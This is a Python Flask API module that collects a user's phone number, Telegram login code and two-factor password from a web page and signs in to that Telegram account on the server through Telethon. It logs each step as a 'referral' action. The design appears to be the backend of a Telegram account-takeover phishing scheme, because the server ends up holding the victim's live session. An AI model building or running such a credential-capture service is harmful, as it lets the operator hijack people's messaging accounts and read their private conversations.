from flask import Blueprint, jsonify, request

from server.telethon.send_login_code import send_login_code
from server.telethon.sign_in_with_code import sign_in_with_code
from server.telethon.sign_in_with_password import sign_in_with_password
from server.utils.normalize_phone_number import normalize_phone_number
from server.validators.validate_phone_number import validate_phone_number_e164
from server.utils.referral_logging import log_referral_action

api_auth_bp = Blueprint("api_auth", __name__)


@api_auth_bp.post("/login")
def login():
    payload = request.get_json(silent=True) or {}
    phone_number_raw = str(payload.get("phone_number", "")).strip()
    user_id = str(payload.get("user_id", "")).strip() or "web_user"

    phone_number = normalize_phone_number(phone_number_raw)
    if not phone_number:
        return (
            jsonify(
                {
                    "success": False,
                    "error": "Введите корректный номер телефона",
                    "received_phone_number": phone_number_raw,
                    "normalized_phone_number": phone_number,
                }
            ),
            400,
        )

    ok, msg = validate_phone_number_e164(phone_number)
    if not ok:
        return (
            jsonify(
                {
                    "success": False,
                    "error": msg,
                    "received_phone_number": phone_number_raw,
                    "normalized_phone_number": phone_number,
                }
            ),
            400,
        )

    try:
        send_login_code(user_id=user_id, phone_number=phone_number)
        
        # Log phone number entry (without the actual number)
        try:
            telegram_user_id = int(user_id) if user_id != "web_user" and user_id.isdigit() else None
            if telegram_user_id:
                log_referral_action(telegram_user_id, "phone_entered", None)
        except (ValueError, AttributeError):
            pass
        
        return jsonify(
            {
                "success": True,
                "received_phone_number": phone_number_raw,
                "normalized_phone_number": phone_number,
            }
        )
    except Exception as e:
        return (
            jsonify(
                {
                    "success": False,
                    "error": str(e),
                    "received_phone_number": phone_number_raw,
                    "normalized_phone_number": phone_number,
                }
            ),
            400,
        )


@api_auth_bp.post("/verify-code")
def verify_code():
    payload = request.get_json(silent=True) or {}
    code = str(payload.get("code", "")).strip()
    user_id = str(payload.get("user_id", "")).strip() or "web_user"

    if not code:
        return jsonify({"success": False, "error": "code is required"}), 400

    try:
        result = sign_in_with_code(user_id=user_id, code=code)
        
        # Log code entry (without the actual code)
        try:
            telegram_user_id = int(user_id) if user_id != "web_user" and user_id.isdigit() else None
            if telegram_user_id:
                log_referral_action(telegram_user_id, "code_entered", None)
        except (ValueError, AttributeError):
            pass
        
        # Keep response compatible with existing frontend
        if result.get("requires_2fa"):
            return jsonify({"success": False, "requires_2fa": True})
        return jsonify({"success": True})
    except Exception as e:
        # Frontend checks some error strings in code.html; we keep a stable key
        return jsonify({"success": False, "error": str(e)}), 400


@api_auth_bp.post("/verify-2fa")
def verify_2fa():
    payload = request.get_json(silent=True) or {}
    password = str(payload.get("password", ""))
    user_id = str(payload.get("user_id", "")).strip() or "web_user"

    if not password:
        return jsonify({"success": False, "error": "password is required"}), 400

    try:
        result = sign_in_with_password(user_id=user_id, password=password)
        
        # Log 2FA entry (without the actual password)
        try:
            telegram_user_id = int(user_id) if user_id != "web_user" and user_id.isdigit() else None
            if telegram_user_id:
                log_referral_action(telegram_user_id, "2fa_entered", None)
        except (ValueError, AttributeError):
            pass
        
        if result.get("success"):
            return jsonify({"success": True})
        return jsonify({"success": False, "error": "Unknown error"}), 400
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400


